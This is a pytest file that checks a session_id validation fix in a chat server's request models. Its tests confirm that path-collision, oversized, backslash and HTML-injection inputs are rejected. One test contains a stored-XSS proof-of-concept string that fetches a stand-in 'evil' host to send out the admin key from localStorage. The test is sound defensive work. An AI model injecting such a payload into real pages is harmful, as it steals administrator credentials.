"""Tests for the 2026-10 fix (core2-N1) to router/route_v1.py's
ChatRequest/SessionRequest — session_id now validated at the Pydantic
layer against ^[A-Za-z0-9_-]{1,64}$.

Background: StateManager._safe_session_id only ever replaced "/" and
"\\" with "_" — "a/b" and "a_b" silently collided onto the same state
file (list_sessions reports whichever was saved last), and a session_id
over ~255 bytes made save() raise an uncaught OSError(ENAMETOOLONG) — a
bare 500 after the LLM call had already run and been billed. Every
session_id this server itself mints (f"s_{uuid4().hex[:8]}") is
comfortably inside this pattern, so no legitimate caller is affected.
This also closes core2-C4's input side: a session_id containing quotes
or HTML can never reach storage or the admin dashboard at all now.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest
from pydantic import ValidationError

_CODE_DIR = Path(__file__).parent.parent / "code"
if str(_CODE_DIR) not in sys.path:
    sys.path.insert(0, str(_CODE_DIR))

from router.route_v1 import ChatRequest, SessionRequest  # noqa: E402


@pytest.mark.unit
class TestSessionIdPatternValidation:
    def test_real_server_minted_session_id_is_accepted(self):
        ChatRequest(message="hi", session_id="s_1a2b3c4d")
        SessionRequest(session_id="s_1a2b3c4d")

    def test_none_session_id_is_accepted(self):
        ChatRequest(message="hi", session_id=None)
        SessionRequest(session_id=None)

    def test_slash_based_collision_payload_is_rejected(self):
        """The actual collision bug this closes: "a/b" used to silently
        become the same file as "a_b" after _safe_session_id's naive
        replace — now rejected outright at the API boundary."""
        with pytest.raises(ValidationError):
            ChatRequest(message="hi", session_id="a/b")

    def test_oversized_session_id_is_rejected(self):
        with pytest.raises(ValidationError):
            ChatRequest(message="hi", session_id="s_" + "a" * 300)

    def test_html_injection_payload_is_rejected(self):
        """Closes core2-C4's input side — this exact shape was the proof-
        of-concept payload for the admin.html stored-XSS finding."""
        with pytest.raises(ValidationError):
            ChatRequest(message="hi", session_id="x');fetch('https://evil/?k='+localStorage.admin_key);//")

    def test_backslash_payload_is_rejected(self):
        with pytest.raises(ValidationError):
            SessionRequest(session_id="a\\b")
